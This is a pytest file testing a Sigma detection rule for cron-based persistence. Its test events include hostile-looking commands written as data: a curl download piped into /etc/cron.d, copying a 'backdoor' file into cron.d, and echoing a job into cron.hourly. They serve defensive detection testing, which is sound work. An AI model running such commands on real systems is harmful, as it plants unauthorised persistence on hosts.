"""Tests for the T1053.003 Cron persistence Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1053_cron_persistence.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- crontab -e (edit flag)             → fires
- crontab /tmp/x (load file)         → fires
- cp /tmp/x /etc/cron.d/x            → fires
- curl ... | tee /etc/cron.d/x       → fires
- apt install crontab-style payload  → does NOT fire (pkg filter)
- cron daemon writing its own file   → does NOT fire (daemon filter)
- random unrelated process           → does NOT fire
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "9b4c1d8e-3a7f-4e2b-8c5d-1f6a9e0b2c4d"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "root",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_crontab_edit_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/crontab", "crontab -e", source_ip="203.0.113.20")
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_crontab_load_file_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/crontab", "crontab /tmp/payload.txt")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_cp_into_cron_d_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/cp", "cp /tmp/backdoor /etc/cron.d/backdoor")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_curl_tee_cron_d_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/tee",
            "curl http://203.0.113.21/c | tee /etc/cron.d/agent",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_echo_into_cron_hourly_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/echo",
            "echo '* * * * * /tmp/x' > /etc/cron.hourly/job",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_apt_install_does_not_fire() -> None:
    """Package manager editing cron paths is legitimate (post-install)."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/apt-get",
            "apt-get install -y postfix && cp helper /etc/cron.d/postfix",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_cron_daemon_self_write_does_not_fire() -> None:
    """Cron daemon reloading its own tables should not alert."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/sbin/cron", "cron /var/spool/cron/crontabs/root")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_unrelated_process_does_not_fire() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls /etc/cron.d/")
    )
    assert fires == []